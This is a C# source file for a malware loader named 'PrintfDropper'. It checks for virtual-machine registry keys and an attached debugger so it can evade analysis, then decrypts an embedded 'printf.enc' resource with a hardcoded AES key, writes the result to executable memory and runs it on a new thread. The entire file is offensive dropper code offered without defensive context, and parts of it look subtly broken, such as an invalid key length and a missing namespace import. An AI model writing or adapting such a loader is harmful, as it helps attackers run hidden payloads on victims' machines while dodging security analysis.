using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace PrintfDropper
{
    class Program
    {
        private static readonly byte[] EncryptionKey = Encoding.UTF8.GetBytes("xPrintf32BitsAES!!");

        static void Main(string[] args)
        {
            if (IsRunningInVirtualMachine() || IsRunningInDebugger())
            {
                return;
            }

            try
            {
                byte[] payload = DecryptEmbeddedFile("printf.enc");
                ExecutePayloadInMemory(payload);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"{ex.Message}");
            }
        }

        private static byte[] DecryptEmbeddedFile(string fileName)
        {
            using (Stream encryptedStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(fileName))
            {
                if (encryptedStream == null)
                {
                    throw new FileNotFoundException("no se especifico ningun payload embebido");
                }

                using (MemoryStream ms = new MemoryStream())
                {
                    encryptedStream.CopyTo(ms);
                    byte[] encryptedData = ms.ToArray();

                    using (Aes aes = Aes.Create())
                    {
                        aes.Key = EncryptionKey;
                        aes.IV = new byte[16];

                        using (ICryptoTransform decryptor = aes.CreateDecryptor())
                        using (MemoryStream decryptedStream = new MemoryStream())
                        {
                            using (CryptoStream cs = new CryptoStream(decryptedStream, decryptor, CryptoStreamMode.Write))
                            {
                                cs.Write(encryptedData, 0, encryptedData.Length);
                                cs.FlushFinalBlock();
                            }

                            return decryptedStream.ToArray();
                        }
                    }
                }
            }
        }

        private static void ExecutePayloadInMemory(byte[] payload)
        {
            IntPtr memory = IntPtr.Zero;
            IntPtr functionPtr = IntPtr.Zero;

            try
            {
                memory = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                Marshal.Copy(payload, 0, memory, payload.Length);

                functionPtr = memory;
                IntPtr threadHandle = IntPtr.Zero;

                try
                {
                    threadHandle = CreateThread(IntPtr.Zero, 0, functionPtr, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(threadHandle, INFINITE);
                }
                finally
                {
                    if (threadHandle != IntPtr.Zero)
                        CloseHandle(threadHandle);
                }
            }
            finally
            {
                if (memory != IntPtr.Zero)
                    VirtualFree(memory, 0, MEM_RELEASE);
            }
        }

        private static bool IsRunningInVirtualMachine()
        {
            string[] virtualMachineIdentifiers = { "VBoxGuest", "VMwareTools", "VPC" };

            foreach (var identifier in virtualMachineIdentifiers)
            {
                try
                {
                    string registryKey = @"SYSTEM\CurrentControlSet\Services\";
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryKey + identifier))
                    {
                        if (key != null)
                        {
                            return true;
                        }
                    }
                }
                catch
                {
                }
            }

            return false;
        }

        private static bool IsRunningInDebugger()
        {
            return Debugger.IsAttached;
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const uint MEM_COMMIT = 0x00001000;
        private const uint MEM_RESERVE = 0x00002000;
        private const uint MEM_RELEASE = 0x00008000;
        private const uint PAGE_EXECUTE_READWRITE = 0x00000040;
        private const uint INFINITE = 0xFFFFFFFF;
    }
}